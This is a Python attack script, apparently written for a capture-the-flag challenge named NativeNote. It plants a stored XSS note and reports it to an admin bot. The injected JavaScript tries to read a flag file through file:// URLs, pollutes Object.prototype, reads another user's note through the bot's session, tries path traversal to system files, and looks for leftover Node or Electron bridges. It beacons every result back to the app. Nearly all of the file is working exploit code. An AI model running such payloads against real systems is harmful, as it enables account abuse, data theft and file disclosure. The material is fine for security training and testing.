#!/usr/bin/env python3
"""
NativeNote — unintended-solution probe.

Sends a single XSS payload that fires several alternative attack paths in
parallel and beacons each result back via fetch('/notes?probe=...'). After
the bot finishes (~25s) we read the Flask logs to see which probes hit.

Probes:
  P1  fetch('file:///flag')                 — file:// from http origin
  P2  XHR file://flag                       — same via XMLHttpRequest
  P3  hidden <iframe src='file:///flag'>    — read .contentDocument
  P4  open('file:///flag')                  — same-origin policy bypass?
  P5  Object.prototype.shell pollution      — unused but check
  P6  Object.prototype.then pollution       — fires on any Promise resolve
  P7  Object.prototype.toString pollution   — fires on String(obj)
  P8  Object.prototype.constructor poll.    — affects util.inspect formatter
  P9  fetch('/note/aaaa…')                  — read other users' notes
  P10 fetch('/out/' + traversal)            — server-side traversal
  P11 read window.process / window.require  — leftover Node refs
  P12 read window.noteAPI                   — what bridge is exposed
"""

import sys
import time
import textwrap
import requests

TARGET = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:8080'

s = requests.Session()
CREDS = {'username': 'probe_x9q1', 'password': 'P!robe123'}
s.post(f'{TARGET}/register', data=CREDS)
s.post(f'{TARGET}/login', data=CREDS)
print('[+] Logged in')

# A second user's note — try to read with the bot's session
other = requests.Session()
OTHER = {'username': 'victim_n3z', 'password': 'V!ctim123'}
other.post(f'{TARGET}/register', data=OTHER)
other.post(f'{TARGET}/login', data=OTHER)
r = other.post(f'{TARGET}/note/new',
               data={'title': 'secret', 'content': '<!-- victim note body -->'},
               allow_redirects=False)
victim_id = r.headers['Location'].rsplit('/', 1)[-1]

probe_js = textwrap.dedent(f"""\
    (() => {{
      const beacon = (k, v) => {{
        try {{ fetch('/notes?probe=' + k + '&v=' + encodeURIComponent(String(v).slice(0,200))); }}
        catch(_) {{}}
      }};
      beacon('boot', location.href);

      // P1: fetch file://
      try {{
        fetch('file:///flag').then(r => r.text()).then(t => beacon('P1', t))
                             .catch(e => beacon('P1err', e.message));
      }} catch(e) {{ beacon('P1ex', e.message); }}

      // P2: XHR file://
      try {{
        const x = new XMLHttpRequest();
        x.onload = () => beacon('P2', x.responseText);
        x.onerror = () => beacon('P2err', x.statusText);
        x.open('GET', 'file:///flag');
        x.send();
      }} catch(e) {{ beacon('P2ex', e.message); }}

      // P3: hidden iframe
      try {{
        const f = document.createElement('iframe');
        f.style.display = 'none';
        f.src = 'file:///flag';
        f.onload = () => {{
          try {{ beacon('P3', f.contentDocument && f.contentDocument.body && f.contentDocument.body.innerText); }}
          catch(e) {{ beacon('P3sop', e.message); }}
        }};
        f.onerror = () => beacon('P3err', 'load failed');
        document.body.appendChild(f);
      }} catch(e) {{ beacon('P3ex', e.message); }}

      // P4: window.open
      try {{
        const w = window.open('file:///flag');
        setTimeout(() => {{
          try {{ beacon('P4', w && w.document && w.document.body && w.document.body.innerText); }}
          catch(e) {{ beacon('P4sop', e.message); }}
        }}, 800);
      }} catch(e) {{ beacon('P4ex', e.message); }}

      // P5: shell/argv0/env pollution (these only matter if something spawns)
      try {{
        Object.prototype.shell = '/bin/sh';
        Object.prototype.argv0 = 'pwned';
      }} catch(e) {{}}

      // P6: Object.prototype.then — fires on every Promise.resolve(obj)
      try {{
        Object.defineProperty(Object.prototype, 'then', {{
          configurable: true,
          value: function(res, rej) {{
            beacon('P6then', 'this=' + (this && this.constructor && this.constructor.name)
                   + ' bind=' + (typeof (this && this.binding))
                   + ' dlo=' + (typeof (this && this.dlopen)));
            if (typeof res === 'function') res(undefined);
          }},
        }});
      }} catch(e) {{ beacon('P6ex', e.message); }}

      // P7: Object.prototype.toString — fires on String(obj) / `${{obj}}`
      try {{
        Object.defineProperty(Object.prototype, 'toString', {{
          configurable: true,
          value: function() {{
            beacon('P7', 'ctor=' + (this && this.constructor && this.constructor.name)
                   + ' bind=' + (typeof (this && this.binding)));
            return '[NN]';
          }},
        }});
      }} catch(e) {{ beacon('P7ex', e.message); }}

      // P8: Object.prototype.constructor — affects util.inspect
      try {{
        Object.prototype.evilCtor = function() {{
          beacon('P8', 'this=' + (typeof this) + ' args=' + arguments.length);
        }};
      }} catch(e) {{}}

      // P9: read victim's note via same-origin bot session
      fetch('/note/{victim_id}').then(r => r.text())
        .then(t => beacon('P9', t.includes('victim note body') ? 'OK' : 'no-leak-' + t.length))
        .catch(e => beacon('P9err', e.message));

      // P10: path traversal in /out/
      ['../../etc/hostname', '../../../flag', '..%2f..%2fflag'].forEach((p, i) => {{
        fetch('/out/' + p).then(r => beacon('P10_'+i, r.status))
          .catch(e => beacon('P10err_'+i, e.message));
      }});

      // P11: leftover Node references on window
      const refs = ['process','require','Buffer','global','setImmediate',
                    '__dirname','__filename','module','exports'];
      const present = refs.filter(k => typeof window[k] !== 'undefined');
      beacon('P11', present.join(',') || '(none)');

      // P12: what's on noteAPI
      try {{
        beacon('P12', Object.keys(window.noteAPI || {{}}).join(','));
      }} catch(e) {{ beacon('P12ex', e.message); }}

      // P13: webPreferences leak via process / electron
      try {{
        beacon('P13', 'webFrame=' + (typeof window.webFrame)
               + ' ipcRenderer=' + (typeof window.ipcRenderer));
      }} catch(e) {{}}
    }})();
""")

content = f'<script>\n{probe_js}\n</script>'
r = s.post(f'{TARGET}/note/new', data={'title':'probe','content':content},
           allow_redirects=False)
exploit_id = r.headers['Location'].rsplit('/', 1)[-1]
print(f'[+] Probe note ID: {exploit_id}')
s.post(f'{TARGET}/report', data={'id': exploit_id})
print('[+] Reported. Sleeping 12s for the bot…')
time.sleep(12)
print('[+] Done. Check `docker logs nativenote-app-1 | grep probe=`')
